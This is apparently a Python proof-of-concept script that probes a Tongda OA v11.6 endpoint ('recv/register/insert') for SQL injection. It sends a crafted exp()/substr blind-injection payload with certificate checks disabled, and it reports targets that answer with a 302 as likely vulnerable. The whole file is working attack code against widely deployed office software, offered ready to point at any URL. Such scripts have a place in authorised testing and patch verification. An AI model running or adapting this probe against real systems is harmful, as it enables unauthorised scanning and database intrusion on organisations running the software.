import time
import requests
import urllib3
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    data='''title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER='''
    exp_url=target_url+'general/document/index.php/recv/register/insert'
    success_msg = now_time() + ' [SUCCESS]  可能存在POST_sql注入漏洞'
    shell_msg = now_time() + '[SUCCESS]  使用数据包做进一步验证'
    warning_msg = now_time() + '[WARNING]  不存在通达OA v11.6 insert SQL注入漏洞'
    error_msg = now_time() + '[通达OA v11.6 insert SQL注入漏洞]未知错误，无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 302:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg
        
            
            
            